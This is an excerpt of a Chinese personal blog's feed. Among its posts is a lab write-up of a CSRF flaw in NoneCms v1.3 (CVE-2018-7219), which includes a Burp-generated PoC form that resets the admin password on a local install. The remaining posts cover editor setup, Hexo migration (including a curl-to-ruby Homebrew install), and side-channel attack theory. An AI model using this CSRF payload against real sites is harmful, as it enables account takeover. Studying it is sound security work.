<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![hhh](https://github.com/xinkjung/Photos/raw/master/IMG_0019.JPG)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>插入超链接</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码格式如下：  [网页链接说明](https://..... url)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Blog</tag>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
    <url>/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
    <content><![CDATA[<p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
<span id="more"></span>


<p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
<p>以修改管理员密码为例，来说明漏洞详情：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
<h4> 参考链接</h4>

<p><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime text3配置PHP</title>
    <url>/2021/08/01/Sublime-text3%E9%85%8D%E7%BD%AEPHP/</url>
    <content><![CDATA[<h4 id="sublime-text3配置PHP环境"><a href="#sublime-text3配置PHP环境" class="headerlink" title="sublime text3配置PHP环境"></a>sublime text3配置PHP环境</h4><blockquote>
<p>准备</p>
</blockquote>
<ul>
<li>Sublime text 3: 可以直接到<a href="http://www.sublimetext.com/">Sublime text3官网</a>下载适合自己电脑的版本安装即可</li>
<li>PHP: 也是到<a href="http://www.phpstudy.net/">phpstudy官网</a>下载安装即可</li>
</ul>
<span id="more"></span>

<blockquote>
<p>PHP安装</p>
</blockquote>
<p>下面进行PHP 环境变量 配置:</p>
<p>安装好phpstudy后，进入其根目录，找到php这个文件夹会发现里面有各种版本的php，随便选择一个版本你使用就 。</p>
<p>右键我的电脑-&gt;属性-高级系统设置-&gt;高级。找到环境变量，点击</p>
<ol>
<li>编辑用户变量的Path，添加你刚刚选择php版本的路径，保存</li>
<li>编辑系统变量的Path，也是一样的做法，添加php存储 并保存</li>
</ol>
<p><img src="https://github.com/xinkjung/Photos/raw/master/yhpath.jpg" alt="用户"><br><img src="https://github.com/xinkjung/Photos/raw/master/xtpath.jpg" alt="系统"></p>
<p>然后”win+R”输入cmd，进入命令提示符窗口，输入php -v ，会显示你的php版本信息，就表示配置完成了哦！！<br>（输入php -h命令也会显示相关信息）<br><img src="https://github.com/xinkjung/Photos/raw/master/php-v.jpg" alt="cmd"></p>
<blockquote>
<p>sublime text3配置PHP编译系统</p>
</blockquote>
<p>打开软件，菜单栏找到Tools-&gt;Build System-&gt;New Build System.<br>这时会弹出如下文件显示代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;shell_cmd&quot;: &quot;make&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;     </span><br><span class="line">	 &quot;cmd&quot;: [&quot;php&quot;, &quot;$file&quot;], </span><br><span class="line">     &quot;file_regex&quot;: &quot;php$&quot;,</span><br><span class="line">     &quot;selector&quot;: &quot;source.php&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后保存在默认路径下，并修改文件名为php.sublime-build，到此就OK啦！！！<br>重启sublime text3，随便输入php代码，再按”ctrl+B”就可以编译了。</p>
<p><img src="https://github.com/xinkjung/Photos/raw/master/helloworld.jpg" alt="php-hw"><br><img src="https://github.com/xinkjung/Photos/raw/master/hw-result.jpg" alt="php-result"></p>
<h4 id="Sublime-text3配置浏览器预览"><a href="#Sublime-text3配置浏览器预览" class="headerlink" title="Sublime text3配置浏览器预览"></a>Sublime text3配置浏览器预览</h4><blockquote>
<p>准备</p>
</blockquote>
<ul>
<li>SideBarEnhancements插件： 这是一款侧边栏增强插件，<br>“ctrl+shift+p”打开快速菜单栏，输入”pcip”，选择”install packages”回车，在搜索框内查找该插件并下载。</li>
</ul>
<blockquote>
<p>配置相关文件</p>
</blockquote>
<p>  首先为插件指定默认浏览器，打开 “ Preference -&gt; Package Settings -&gt; Side Bar -&gt; Settings-User”,在打开的文件中输入以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">  &quot;default_browser&quot;: &quot;firefox&quot; //one of this list: firefox, aurora, chrome, canary, chromium, opera, safari</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>默认浏览器可以是列表任一，我选用的是火狐Firefox</p>
<p>然后为插件指定默认localhost目录，在侧边栏任意文档上右键，选择”Project -&gt; Edit Preview URLs”,在文件中添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;F:/PHP/text/&quot;:&#123;</span><br><span class="line">        &quot;url_testing&quot;: &quot;http://localhost:81/&quot;,</span><br><span class="line">        &quot;url_production&quot;: &quot;http://xinkjung.com/&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 1.”F:/PHP/text/“： 是文件在磁盘中的路径</p>
<p> 2.”url_testing”: 本地localhost路径，请根据个人情况修改</p>
<p> 3.”url_production”：项目线上地址（好像可以随便填）</p>
<p> 接下来最后一步，为浏览器绑定热键，打开”Preference -&gt; Package Settings -&gt; Side Bar -&gt; key Bindings-User”，在打开的文件中添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;keys&quot;: [&quot;ctrl++shift+f1&quot;],</span><br><span class="line">        &quot;command&quot;: &quot;side_bar_open_in_browser&quot;,</span><br><span class="line">        &quot;args&quot;: &#123;</span><br><span class="line">                    &quot;paths&quot;: [],</span><br><span class="line">                    &quot;type&quot;: &quot;testing&quot;,</span><br><span class="line">                    &quot;browser&quot;: &quot;firefox&quot;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>我使用的是”ctrl+shift+f1”，可视个人习惯而定，浏览器我选用Firefox。</p>
<p>到此，所有就设置好啦，在页面中按相应热键，选择文件就能在设置的浏览器中浏览啦！！！</p>
<ul>
<li>注：一定要打开phpstudy,且文件放置在WWW目录下才可实现哦~</li>
</ul>
<p>附上参考链接：<br>1、<a href="https://jingyan.baidu.com/article/15622f2419ce79fdfcbea5ea.html">https://jingyan.baidu.com/article/15622f2419ce79fdfcbea5ea.html</a></p>
<p>2、<a href="https://jingyan.baidu.com/article/09ea3ede04ebe9c0aede390d.html">https://jingyan.baidu.com/article/09ea3ede04ebe9c0aede390d.html</a></p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Sublime text3</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows转Mac继续管理GitHub博客</title>
    <url>/2021/08/24/Windows%E8%BD%ACMac%E7%BB%A7%E7%BB%AD%E7%AE%A1%E7%90%86GitHub%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h2 id="变！"><a href="#变！" class="headerlink" title="变！"></a>变！</h2><p>从 Windwos 换了 Mac，怎么在 Mac 上继续使用 git 在 GitHub 上传自己的项目呢？</p>
<p>解决方案：</p>
<ol>
<li>在 Mac 上下载 git 、 node.js 和 hexo</li>
<li>在 Mac 上 clone 自己的项目到目录</li>
</ol>
<blockquote>
<p>第一步：下载和安装</p>
</blockquote>
<p>这里使用 homebrew 进行安装<br>(1) 安装 homebrew</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;</span><br></pre></td></tr></table></figure>

<p>(2) 下载 git 和 node.js </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install git</span><br><span class="line">brew install node</span><br><span class="line">npm install hexo g </span><br></pre></td></tr></table></figure>

<p>可以使用 <code>git</code> 或 <code>git -verison</code> 命令来验证 git 版本。</p>
<p>(3) 初始化 hexo 目录</p>
<p>新建一个 hexo 目录用于存放博客相关文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir bolg</span><br></pre></td></tr></table></figure>

<p>在博客根目录打开终端窗口，对目录进行初始化操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>

<p>再用 <code>hexo s</code> 测试是否成功，打开 <code>localhost:4000</code> 即可查看本地预览 </p>
<blockquote>
<p>第二步： SSH 配置 git</p>
</blockquote>
<p>(1) 设置 <code>username</code> 和 <code>email</code> （github每次commit都会记录他们） </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;登录账号名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱账号&quot;</span><br></pre></td></tr></table></figure>

<p>(2) 先查看本地是否已存在 <code>SSH key</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure>

<p>我的新电脑是没有的，直接通过终端命令创建 <code>ssh key</code> ，然后一直回车，输入 <code>用户名 + 密码</code>（ GitHub 登录的），最后会生成一串密钥。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C “邮箱账号&quot;</span><br></pre></td></tr></table></figure>

<p>(3) 登陆 GitHub ，找到 Settings ，点击 SSH AND GPG Keys –&gt; New SSH key ，把刚刚看到的 key 复制粘贴进去，title 随便写</p>
<figure class="highlight plaintext"><figcaption><span>复制id_rsa.pub</span></figcaption><table><tr><td class="code"><pre><span class="line">cat .ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>保存后，GitHub 会向邮箱发送一个验证链接，记得要登录邮箱进行验证，不然之后会导致部署不成功</p>
<p>(4) 验证一下，如果出现 <code>hi +用户名</code> 即为成功 ~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com </span><br></pre></td></tr></table></figure>

<blockquote>
<p>第三步: clone 项目 / 文件配置转移</p>
</blockquote>
<p>把原来的项目复制下来，可以随便添加点东西去测试是否可以上传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git  clone https://wxxxx.git</span><br></pre></td></tr></table></figure>

<p>这里我是直接复制原来 Windows 下的博客根目录 hexo 过来的，然后找到该目录下的：<code>_config.yml</code> 、 <code>scaffolds</code> 、 <code>source</code> 、 <code>themes</code> 这四个文件夹，把它们复制到<br>Mac 下的博客根目录 hexo，直接覆盖替换相同的文件文件夹就可以了。</p>
<h2 id="problems-？"><a href="#problems-？" class="headerlink" title="problems ？"></a>problems ？</h2><h3 id="Mac-终端-shell-类型切换方法"><a href="#Mac-终端-shell-类型切换方法" class="headerlink" title="Mac 终端 shell 类型切换方法"></a>Mac 终端 shell 类型切换方法</h3><p>可以执行命令 <code>echo $SHELL</code>，先查看终端类型：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash: /bin/bash</span><br><span class="line">zsh: /bin/zsh</span><br></pre></td></tr></table></figure>

<p>切换到bash，输入命令：<br><code>chsh -s /bin/bash</code></p>
<p>切换到zsh，输入命令：<br><code>chsh -s /bin/zsh</code></p>
<p>ps: 注意需要重启终端生效（强制退出后再打开）</p>
<h3 id="GitHub-网站打不开或访问慢怎么解决"><a href="#GitHub-网站打不开或访问慢怎么解决" class="headerlink" title="GitHub 网站打不开或访问慢怎么解决"></a>GitHub 网站打不开或访问慢怎么解决</h3><p>查询 <code>github.com</code> 的有效IP，可以使用<a href="http://tool.chinaz.com/dns">站长工具</a><br>然后将查询到的 IP 地址复制到自己的 <code>hosts</code> 文件里即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Host Database</span><br><span class="line"># localhost is used to configure the loopback interface</span><br><span class="line"># when the system is booting.  Do not change this entry.</span><br><span class="line">##</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">255.255.255.255	broadcasthost</span><br><span class="line">::1             localhost</span><br><span class="line">203.208.39.104 github.com</span><br><span class="line">13.114.40.48 github.com</span><br><span class="line">52.69.186.44 github.com</span><br></pre></td></tr></table></figure>

<h3 id="Mac如何编辑-hosts-系统文件"><a href="#Mac如何编辑-hosts-系统文件" class="headerlink" title="Mac如何编辑 hosts 系统文件"></a>Mac如何编辑 hosts 系统文件</h3><p><code>前往 -&gt; 前往文件夹 -&gt; （输入）/etc/hosts</code> ，回车找到 <code>hosts</code> 文件，然后打开对其进行编辑会提示没有权限并询问是否复制，点击复制按钮，然后在新的窗口里可以编辑文件，编辑完成后保存窗口显示文件名是未命名的 <code>hosts副本.txt</code> ，我们将名称改为 <code>hosts</code> (记得去除后缀名txt)，然后保存并替换原来的 <code>hosts</code> 文件。</p>
<h3 id="Mac-的-ssh-文件在哪里"><a href="#Mac-的-ssh-文件在哪里" class="headerlink" title="Mac 的 .ssh 文件在哪里"></a>Mac 的 .ssh 文件在哪里</h3><p>鼠标点击一下桌面回到 🍎 菜单栏， <code>前往 -&gt; 前往文件夹 -&gt; （输入） ~/.ssh</code> 回车即可。<br>即：shift+command+G -&gt; 输入 ~/.ssh</p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/07/26/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>侧信道攻击技术简介</title>
    <url>/2021/08/24/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h2 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h2><p>侧信道攻击(side channel attack 简称SCA)，又称边信道攻击或旁路攻击，密码学中是指绕过对加密算法的繁琐分析，利用密码算法的硬件实现的运算中泄露的信息，如执行时间、功耗、电磁辐射等，结合统计理论快速的破解密码系统。其核心思想是通过加密软件或硬件运行时产生的各种泄漏信息获取密文信息。</p>
<p>密码芯片在运算过程中会产生多种类型的泄露信息，而传统的密码分析则忽略了这些“细微”的信息对密码系统安全性的影响。这类新发现的物理泄漏信息被研究学者称为旁路信息(side-chalinelLeakage)，与之对应的攻击方法被称为旁路攻击(side-channel Attack)。</p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在狭义上讲，边信道攻击特指针对密码算法的非侵入式攻击，通过加密电子设备在运行过程中的边信道信息泄露破解密码算法，狭义的边信道攻击主要包括针对密码算法的计时攻击、能量分析攻击、电磁分析攻击等，这类新型攻击的有效性远高于密码分析的数学方法，因此给密码设备带来了严重的威胁。</p>
<p>从广义上讲，针对安全设备的侵入式、半侵入式、非侵入式攻击等任何“旁门左道”的攻击方法都属于边信道攻击的范畴。广义上的边信道攻击往往脑洞大开，攻击方式也五花八门，如针对键盘敲击内容的边信道攻击有声音分析攻击、电磁分析攻击、通过WiFi信道状态进行的攻击（WiKey），以及通过内核使用状态和进程信息进行的攻击等。</p>
<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><p>要成功对集成电路芯片进行旁路攻击必须满足两条： </p>
<ul>
<li>在泄漏的物理信号与处理的数据之间建立联系； </li>
<li>在信息泄漏模型中处理的数据与芯片中处理的数据之间建立联系。</li>
</ul>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>密码学中侧信道攻击的理念最早在1996年由Paul Kocher提出，此后成为密码学中一种重要的密钥恢复方法。它通过利用密码设备在运行密码算法时所泄露的电磁、功耗、声音等物理信息来进行密钥恢复。对于一些设计良好的密码算法，侧信道攻击可能是实际中恢复密钥的唯一可行办法。<br>所有的攻击类型都利用了加密/解密系统在进行加密/解密操作时算法逻辑没有被发现缺陷，但是通过物理效应提供了有用的额外信息（这也是称为“旁路”的缘由），而这些物理信息往往包含了密钥、密码、密文等隐密数据。根据借助的介质或攻击者利用信息的种类，侧信道攻击分为多个大类，主要分为时间攻击、功耗分析攻击、电磁辐射攻击、故障注入攻击等。</p>
<ul>
<li>故障攻击/注入</li>
</ul>
<p>利用错误计算的结果（或考虑篡改设备上的密码系统），观察密码设备的一些错误操作，从错误行为的结果中分析推导出秘密参数。<br>错误可能导致程序或者设计错误（例如 Intel著名的FDIV错误），或者被攻击者诱导的错误（例如，能量故障，时钟故障，温度变化，离子束注入等）。</p>
<ul>
<li>计时攻击</li>
</ul>
<p>通过分析加密算法的时间执行来推导出密码，是利用密码系统的密钥与运行时间的关系来进行攻击的方法，与其它侧信道攻击相比，这种攻击方法几乎不需要什么特殊设备。<br>每一个逻辑运算在计算机需要时间来执行，根据输入不同，精确测量执行时间，根据执行时间反推出密码。例如：通过设备运算的用时来推断出所使用的运算操作，或者通过对比运算的时间推定数据位于哪个存储设备，或者利用通信的时间差进行数据窃取。</p>
<ul>
<li>功耗/能量攻击</li>
</ul>
<p>通过分析密码设备的能量消耗这一物理特性来恢复设备内部的秘密信息获得其密钥。<br>功耗攻击是目前最强有力的侧信道攻击手段之一，包括简单功耗分析攻击（SimplePower Analysis attacks,SPA）和差分功耗分析攻击（Differential　Power　Analysis　attacks,DPA），与传统密码分析学相比，这些攻击手段攻击效果显著。</p>
<ul>
<li>电磁攻击</li>
</ul>
<p>通过高精度电磁探头多次采集目标产品（设备）工作时泄漏电磁辐射的强度变化，经过得当分析的话可解析出这些泄漏的电磁辐射中包含的信息（比如文本、声音、图像等），这种攻击方式除了用于密码学攻击以外也被用于非密码学攻击等窃听行为，如TEMPEST攻击（例如范·埃克窃听、辐射监测）。</p>
<ul>
<li>缓存攻击</li>
</ul>
<p>通过获取对缓存的访问权而获取缓存内的一些敏感信息，例如攻击者获取云主机物理主机的访问权而获取存储器的访问权。 </p>
<ul>
<li>其他</li>
</ul>
<p>基于扫描的攻击、光学辐射攻击、基于频率的攻击、组合攻击、声音攻击等。</p>
<h3 id="能量攻击（功耗分析攻击）"><a href="#能量攻击（功耗分析攻击）" class="headerlink" title="能量攻击（功耗分析攻击）"></a>能量攻击（功耗分析攻击）</h3><p>1999 年，Kocher 等人提出了功耗分析的理念，该攻击方式是非入侵式，在攻击过程中不需要破坏密码设备，通过利用密码芯片执行过程中泄露的功耗信息来获取中间值，从而进行密钥恢复。功耗分析主要包括简单功耗分析(Simple Power Analysis，SPA)、差分功耗分析(Differential Power Analysis，DPA)、相关功耗分析(Correlation Power Analysis，CPA)等。</p>
<ol>
<li>简单功耗分析， SPA</li>
</ol>
<p>简单功耗分析是利用加密操作实现细节与功耗之间的关系，直接从测量的功耗轨迹获取密钥信息。在执行算法时，电路在不同时期处于不同的状态，比如存取数据、算术或逻辑运算等，假设将电路的运行时间分成对应不同于电路状态的时间段，那么在每个时间段中电路功耗不尽相同。SPA本质上就是从功耗轨迹（对密码设备在运算时的功耗情况进行采样所获取的曲线）上进行猜测，在一个特定时间执行了什么特定指令以及指令中设计的秘密参量。</p>
<ol start="2">
<li>差分功耗分析， DPA</li>
</ol>
<p>差分功耗分析是功耗分析中比较方便有效的一种，主要是通过利用不同的明文输入所对应的功耗曲线不同，然后结合统计分析和误差修正技术，从大量的功耗曲线中推测出密码算法中与密钥信息具有相关性的中间结果，最终实现对密码算法的破解，与简单功耗分析攻击(SPA)相比具有更高的攻击强度，对密码芯片造成的安全威胁更大。</p>
<ol start="3">
<li>相关功耗分析， CPA</li>
</ol>
<p>相关功耗分析是采用统计学的方法对模拟功耗和真实功耗进行相关系数计算。该方法首先在加密设备进行数据加密时进行实际功耗信息的测量即真实功耗，而后利用功耗攻击模型对攻击电路进行理论功耗的预测即模拟功耗，再将实测功耗与预测的理论功耗进行计算得出对应的相关系数。在猜测密钥正确的条件下，功耗攻击模型计算出预测的理论功耗与实测功耗具有很大程度上的相关性。根据相关性的大小对猜测密钥的准确率进行判断，相关系数越大，表明此时猜测密钥越接近真实密钥，反之猜测密钥与真实密钥相差越大，当相关系数为最大值时，猜测密钥即为所需的正确密钥。</p>
<h3 id="差分故障攻击"><a href="#差分故障攻击" class="headerlink" title="差分故障攻击"></a>差分故障攻击</h3><p>差分故障攻击是将故障注入和传统的密码分析方法差分分析结合起来的一种新型侧信道攻击。<br>其核心思想是通过分析密码设备产生的正确密文和故障注入后错误密文之间的关系，从而恢复出算法的原始密钥。</p>
<p>故障注入就是在某个合适的时间改变密码芯片的工作条件，使得密码芯片运行的中间状态发生改变，进而产生错误的输出或异常的旁路泄漏。根据攻击者侵入密码设备接口和运行环境的程度，可讲故障注入分为非侵入式故障注入、半侵入式故障注入和侵入式故障注入三种。后两种方式是基于存储数据的修改，而不是传输过程故障，所以都需要在物理上接触密码芯片，还需要昂贵的用于剖片处理的设备和化学用品，以及用于注入故障的特殊设备。而非侵入式故障注入则是通过外界干扰的方式，如时钟、电压或磁场等，让密码芯片执行出错，相比于其他两种 方式具有更高的可行性。</p>
<h3 id="模板攻击"><a href="#模板攻击" class="headerlink" title="模板攻击"></a>模板攻击</h3><p>模板攻击就是指攻击者在目标设备的同类型设备或者其复制品上创建一个”profile”，随后利用这一”profile”快速恢复目标设备的密钥。<br>相较于CPA，模板攻击对攻击者的要求更高。模板攻击要求攻击者拥有一个和目标同样的实验设备，这个设备是攻击者可控的，能够控制输入数据且能够获取大量的能量迹。攻击者需要对目标设备的复制品具有完全的控制权，并且进行大量的前期工作以建立模板，不过，一旦模板建立，攻击者能够以很小的代价完成攻击。在模板足够好的情况下（如建模所用的能量迹数量足够大），攻击者仅需一条能量迹即可恢复密钥。</p>
<p>模板攻击分为以下四步：</p>
<ul>
<li>利用一个可以完全控制的目标设备的复制品，使用不同的输入（明文和密钥）进行计算并采集曲线，确保采集的曲线足够提供给攻击者每一种密钥猜测对应的信息</li>
<li>创建模板，模板是一种POIs(points of interest)的多元分布</li>
<li>在目标设备上，使用少量的不同明文加密获取相应的曲线（目标设备的密钥不受攻击者控制）</li>
<li>利用模板进行攻击，找到最可能正确的密钥猜测值</li>
</ul>
<p>我们也可以概括为三个主要步骤：</p>
<ul>
<li>兴趣点提取</li>
<li>模板构建</li>
<li>模板匹配</li>
</ul>
<p>一、 兴趣点提取：</p>
<p><img src="/images/%E5%85%B4%E8%B6%A3%E7%82%B9%E6%8F%90%E5%8F%961.png" alt="兴趣点提取"></p>
<p><img src="/images/%E5%85%B4%E8%B6%A3%E7%82%B9%E6%8F%90%E5%8F%962.png" alt="兴趣点提取"></p>
<p>二、 常见模板构建策略：</p>
<ul>
<li>数据和密钥对模板构建</li>
<li>中间值模板构建</li>
<li>基于能量模型的模板构建（汉明重量）</li>
</ul>
<p><img src="/images/%E6%A8%A1%E6%9D%BF%E6%9E%84%E5%BB%BA.png" alt="模板构建"></p>
<p>三、 模板匹配</p>
<p><img src="/images/%E6%A8%A1%E6%9D%BF%E5%8C%B9%E9%85%8D.png" alt="模板匹配"></p>
<h4> 参考链接 </h4>

<ol>
<li><a href="https://baike.baidu.com/item/%E6%97%81%E8%B7%AF%E6%94%BB%E5%87%BB/1464885">旁路攻击_百度百科</a></li>
<li><a href="https://baike.baidu.com/item/%E8%BE%B9%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/7342042?fr=aladdin">边信道攻击_百度百科</a></li>
<li><a href="https://blog.csdn.net/weixin_46661122/article/details/109740368">关于侧信道攻击 - CSDN博客</a></li>
<li><a href="https://www.cnblogs.com/zhuowangy2k/p/12242774.html">第三十九个知识点:侧信道攻击和故障攻击有什么区别</a></li>
</ol>
]]></content>
      <categories>
        <category>侧信道</category>
      </categories>
      <tags>
        <tag>侧信道</tag>
      </tags>
  </entry>
  <entry>
    <title>《小迪安全》课程随记</title>
    <url>/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/</url>
